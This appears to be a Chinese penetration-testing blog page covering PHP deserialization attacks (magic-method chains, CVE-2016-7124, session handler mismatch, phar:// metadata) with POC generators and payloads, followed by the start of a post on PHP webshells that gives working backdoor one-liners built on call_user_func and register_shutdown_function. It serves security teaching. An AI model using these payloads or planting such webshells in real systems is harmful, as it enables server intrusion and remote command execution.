<h6 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class evil&#123;</span><br><span class="line">	</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		var_dump($test);</span><br><span class="line">		assert($test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class lltest&#123;</span><br><span class="line">	var $test;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj = new evil($this-&gt;test);  //new时调用__construct</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$myclass = $_GET[&apos;www&apos;];</span><br><span class="line">$myclass_unser = unserialize($myclass);</span><br><span class="line">//print_r($myclass_unser);</span><br><span class="line">var_dump($myclass_unser);</span><br><span class="line"></span><br><span class="line">//?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;   相当于执行assert(&quot;phpinfo();&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h6 id="生成POC-1"><a href="#生成POC-1" class="headerlink" title="生成POC"></a>生成POC</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成反序列化POC</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $test=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class3 = new lltest;</span><br><span class="line">$class3_ser = serialize($class3);</span><br><span class="line">echo $class3_ser;</span><br><span class="line"></span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="利用普通成员方法-相同函数名称"><a href="#利用普通成员方法-相同函数名称" class="headerlink" title="利用普通成员方法-相同函数名称"></a>利用普通成员方法-相同函数名称</h4><p>当漏洞/危险代码存在类的普通方法中，就不能通过“自动调用”来触发漏洞。这时的利用方法：寻找相同的函数名，把敏感函数和类联系在一起</p>
<h6 id="测试代码-2"><a href="#测试代码-2" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接访问u2.php  执行输出hello  执行class normal 中的 function action() </span><br><span class="line">访问 u2.php?www=O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;  相当于执行assert(&quot;phpinfo();&quot;);   执行class evil中的 function action()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test1 = new normal();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test1-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class normal &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        assert($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass = new lltest();</span><br><span class="line">unserialize(@$_GET[&apos;www&apos;]);</span><br><span class="line">//直接访问u2.php  输出hello</span><br><span class="line">//访问 u2.php?www=O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;  相当于执行assert(&quot;phpinfo();&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h6 id="生成POC-2"><a href="#生成POC-2" class="headerlink" title="生成POC"></a>生成POC</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成反序列化POC</span><br><span class="line">class lltest &#123;</span><br><span class="line">    var $test1;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test1 = new evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2 = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$myclass_poc = new lltest();</span><br><span class="line">echo serialize($myclass_poc);</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:5:&quot;test1&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="三-CVE-2016-7124"><a href="#三-CVE-2016-7124" class="headerlink" title="(三)    CVE-2016-7124"></a>(三)    CVE-2016-7124</h3><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124</a><br>当序列化字符串中表示对象个数的值大于真实的属性个数时会跳过__wakeup()的执行。<br>存在该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10。<br>典型漏洞：SugarCRM v6.5.23 PHP反序列化对象注入</p>
<h4 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>测试版本：PHP Version 5.5.38<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）如果请求CVE-2016-7124.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;  执行\__wakeup() 方法清除了对象属性，把$test值清空，在test.php写入内容为空 </span><br><span class="line"></span><br><span class="line">2）如果请求CVE-2016-7124.php?www=O:6:&quot;lltest&quot;:99:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">对象个数设为99 跳过\__wakeup() 在test.php写入&lt;?php phpinfo();</span><br></pre></td></tr></table></figure></p>
<h4 id="CVE-2016-7124-php"><a href="#CVE-2016-7124-php" class="headerlink" title="CVE-2016-7124.php"></a>CVE-2016-7124.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//CVE-2016-7124</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">		var_dump($this);</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\test.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()  //在__wakeup中清除了对象属性  把$test值清空</span><br><span class="line">        &#123;</span><br><span class="line">            foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">                    $this-&gt;$k = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = $_GET[&apos;www&apos;];</span><br><span class="line">$poc_un = @unserialize($poc);</span><br><span class="line">//***.php?www=O:6:&quot;lltest&quot;:99:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">//CVE-2016-7124 对象个数设为99 跳过__wakeup() 在test.php写入&lt;?php phpinfo();</span><br><span class="line"></span><br><span class="line">//***.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;  执行__wakeup() 在test.php写入内容为空</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="四-Session反序列化漏洞"><a href="#四-Session反序列化漏洞" class="headerlink" title="(四)    Session反序列化漏洞"></a>(四)    Session反序列化漏洞</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><a href="http://php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.session-start.php</a><br><a href="http://php.net/manual/zh/function.session-set-save-handler.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.session-set-save-handler.php</a><br><a href="http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler" target="_blank" rel="noopener">http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler</a><br>1）Session反序列化漏洞，主要是由于: 当PHP在反序列化取出已存储的$_SESSION数据时所使用的处理器与之前序列化存储$_SESSION所使用的处理器不一样，会导致数据无法正确反序列化，可能导致存在漏洞。（存$_SESSION-序列化，取$_SESSION-反序列化）<br>2）当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</p>
<p>3）PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化（存$_SESSION-序列化，取$_SESSION-反序列化），常用的有以下三种，对应三种不同的处理格式：【session.serialize_handler 配置选项】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">处理器	  对应的存储格式</span><br><span class="line">php (默认):键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化处理的值。如：lltest|s:6:&quot;qwe123&quot;;</span><br><span class="line">php_serialize (php&gt;=5.5.4):经过 serialize() 函数反序列处理的数组。如：a:1:&#123;s:6:&quot;lltest&quot;;s:6:&quot;qwe123&quot;;&#125;</span><br><span class="line">php_binary:键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数序列化处理的值。如：lltests:6:&quot;qwe123&quot;;</span><br></pre></td></tr></table></figure></p>
<p>4）通过竖线|构造POC。<br>在存储$_SESSION数据时如果用的处理器是php_serialize ，通过竖线|构造POC,写入含有恶意代码的序列化数据。<br>在读取$_SESSION数据时如果用的处理器是 php 的话，会将竖线|后面的数据进行反序列化，从而触发漏洞。</p>
<h4 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1）	先请求sess1.php?www=|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;</span><br><span class="line">会在D:\phpStudy3\tmp\tmp\sess_jo0lfdd66sti0i1pfdfosgtec2文件中存储内容,如下</span><br><span class="line">a:1:&#123;s:6:&quot;lltest&quot;;s:52:&quot;|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;&quot;;&#125;</span><br><span class="line">存储$_SESSION数据时如果用的处理器是php_serialize </span><br><span class="line"></span><br><span class="line">2）然后直接访问sess2.php  就会在D:\\phpStudy3\\WWW\\test\\目录下生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">在读取$_SESSION数据时用的处理器设置为 php，会将竖线|后面的数据进行反序列化，触发漏洞</span><br><span class="line">最终生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br></pre></td></tr></table></figure>
<h4 id="代码示例1-sess1-php"><a href="#代码示例1-sess1-php" class="headerlink" title="代码示例1 sess1.php"></a>代码示例1 sess1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sess1.php</span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&apos;lltest&apos;] = $_GET[&apos;www&apos;];</span><br><span class="line">print_r($_SESSION);</span><br><span class="line"></span><br><span class="line">//提交请求xxx.php?www=|O:6:&quot;lltest&quot;:1:&#123;s:3:&quot;www&quot;;s:16:&quot;&lt;?php phpinfo();&quot;;&#125;    通过竖线|构造POC</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="代码示例2-sess2-php"><a href="#代码示例2-sess2-php" class="headerlink" title="代码示例2 sess2.php"></a>代码示例2 sess2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sess2.php</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $www;</span><br><span class="line">    </span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">		var_dump($_SESSION);  //输出：array(1) &#123; [&quot;a:1:&#123;s:6:&quot;lltest&quot;;s:52:&quot;&quot;]=&gt; object(lltest)#1 (1) &#123; [&quot;www&quot;]=&gt; string(16) &quot;</span><br><span class="line">		//可看出:将之前存储的$_SESSION进行反序列化，还原为对象object lltest</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\lltest3.php&quot;,&quot;w&quot;);</span><br><span class="line">        fputs($fp,$this-&gt;www);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//最终生成lltest3.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="五-phar伪协议触发php反序列化"><a href="#五-phar伪协议触发php反序列化" class="headerlink" title="(五)    phar伪协议触发php反序列化"></a>(五)    phar伪协议触发php反序列化</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>phar文件本质上是一种压缩文件，能够以序列化的形式存储用户自定义的meta-data，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，会将meta-data进行反序列化，从而导致触发漏洞。<br>受影响的函数如下：<br>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><a href="http://php.net/manual/en/phar.fileformat.phar.php" target="_blank" rel="noopener">http://php.net/manual/en/phar.fileformat.phar.php</a><br>一个phar文件有四部分构成：<br>1）a stub<br>可以理解为一个标志，格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。<br>2）a manifest describing the contents<br>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p>3） the file contents<br>被压缩文件的内容。<br>4） [optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾</p>
<h4 id="漏洞测试-2"><a href="#漏洞测试-2" class="headerlink" title="漏洞测试"></a>漏洞测试</h4><p>说明：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</p>
<p>1）先访问phar1.php 文件，生成lltest1.phar文件，并以反序列化形式写入payload &lt;?php phpinfo();</p>
<p>2）请求phar2.php?www=phar://./lltest1.phar/test.txt<br>最终生成lltest6.php文件，内容为&lt;?php phpinfo();</p>
<p>在1）生成lltest1.phar之后，也可以将lltest1.phar文件改成任意后缀如jpg，然后请求phar2.php?www=phar://./lltest1.jpg/test.txt</p>
<p>phar://路径/lltest1.phar/test.txt</p>
<h4 id="代码示例1-phar1-php"><a href="#代码示例1-phar1-php" class="headerlink" title="代码示例1 phar1.php"></a>代码示例1 phar1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $payload = &quot;&lt;?php phpinfo();&quot;;</span><br><span class="line">	//var $payload = &quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;lltest1.phar&quot;);</span><br><span class="line">$test = new lltest();</span><br><span class="line">$phar = new Phar(&quot;lltest1.phar&quot;); //后缀必须为hpar，生成后可改成任意后缀如jpg</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // //设置stub 并伪造gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);  //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="代码示例2-phar2-php"><a href="#代码示例2-phar2-php" class="headerlink" title="代码示例2 phar2.php"></a>代码示例2 phar2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $www = $_GET[&apos;www&apos;];</span><br><span class="line">    class lltest&#123;</span><br><span class="line">        var $payload;</span><br><span class="line">        </span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">		var_dump($this-&gt;payload);  //当payload中含有&lt;时无法 无法输出</span><br><span class="line">		//echo &quot;phar test&quot;;</span><br><span class="line">        $fp = fopen(&quot;D:\\phpStudy3\\WWW\\test\\lltest6.php&quot;,&quot;w&quot;); //自定义写入路径</span><br><span class="line">        fputs($fp,$this-&gt;payload);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    file_get_contents($www);</span><br><span class="line">	//file_get_contents(&quot;phar://./lltest1.phar/test.txt&quot;);</span><br><span class="line">	</span><br><span class="line">	//phar://路径/lltest1.phar/test.txt</span><br><span class="line">	//请求: ***.php?www=phar://./lltest1.phar/test.txt</span><br><span class="line">	//最终生成lltest6.php文件，内容为&lt;?php phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="六-补充-phar伪协议绕过WAF"><a href="#六-补充-phar伪协议绕过WAF" class="headerlink" title="(六)    补充:phar伪协议绕过WAF"></a>(六)    补充:phar伪协议绕过WAF</h3><p>使用phar://伪协议可Bypass一些waf，大多数情况下配合文件包含一起使用。</p>
<p>1）必须先把pharbypass1.php压缩。<br>或者压缩完之后，修改为其他任意后缀 如jpg 来绕过上传限制等<br>然后修改pharbypass2.php为include(‘phar://./pharbypass1.jpg/pharbypass1.php’)</p>
<p>2）请求pharbypass2.php,会include文件pharbypass1.zip中的pharbypass1.php  执行system(‘whoami’)</p>
<h4 id="pharbypass1-php"><a href="#pharbypass1-php" class="headerlink" title="pharbypass1.php"></a>pharbypass1.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&apos;whoami&apos;);</span><br><span class="line">//必须先压缩该文件。压缩完之后，可以再修改为其他任意后缀 如jpg 来绕过上传限制等</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="pharbypass2-php"><a href="#pharbypass2-php" class="headerlink" title="pharbypass2.php"></a>pharbypass2.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;phar://./pharbypass1.zip/pharbypass1.php&apos;);</span><br><span class="line">//请求pharbypass2.php,会include文件pharbypass1.zip中的pharbypass1.php  执行system(&apos;whoami&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>  浅谈php反序列化漏洞<br><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a>  四个实例递进php反序列化漏洞理解<br><a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a>  SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析<br><a href="http://www.vuln.cn/6413" target="_blank" rel="noopener">http://www.vuln.cn/6413</a>  PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患<br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>  利用 phar 拓展 php 反序列化漏洞攻击面<br><a href="https://xz.aliyun.com/t/3692" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692</a>  Phar的一些利用姿势 </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/22/PHP花式WEBSHELL/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/22/PHP花式WEBSHELL/" itemprop="url">PHP花式WEBSHELL</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-22T21:29:21+08:00">
                2019-01-22
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>PHP可通过回调函数、可变函数、拆分重组、base64编码、rot13加密、chr编码、注释、运算（异或、取反、自增等）、正则函数、session机制、referer、php反射、php反序列化、404马、php内存马等形式生成webshell。</p>
<p>防护:在要防护的目录下上传如下.htaccess，禁止该目录运行php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;.php&quot;&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="1-回调函数"><a href="#1-回调函数" class="headerlink" title="1)    回调函数"></a>1)    回调函数</h3><p>php中包含回调（callable类型）函数参数的函数，基本都可能用做后门。</p>
<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	call_user_func($_REQUEST[&apos;a1&apos;],$_REQUEST[&apos;a2&apos;]);</span><br><span class="line">	//POST: a1=system&amp;a2=whoami  //命令执行</span><br><span class="line">	///POST: a1=assert&amp;a2=phpinfo()   //代码执行</span><br><span class="line">	//caidao: ***.php?a1=assert  pass:a2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function()"></a>register_shutdown_function()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = $_REQUEST[&apos;a&apos;];</span><br><span class="line">register_shutdown_function($a, $_REQUEST[&apos;www&apos;]);</span><br><span class="line"></span><br><span class="line">// POST: a=assert&amp;www=phpinfo()</span><br><span class="line">// caidao:   ***.php?a=assert  pass:www</span><br></pre></td></tr></table></figure>
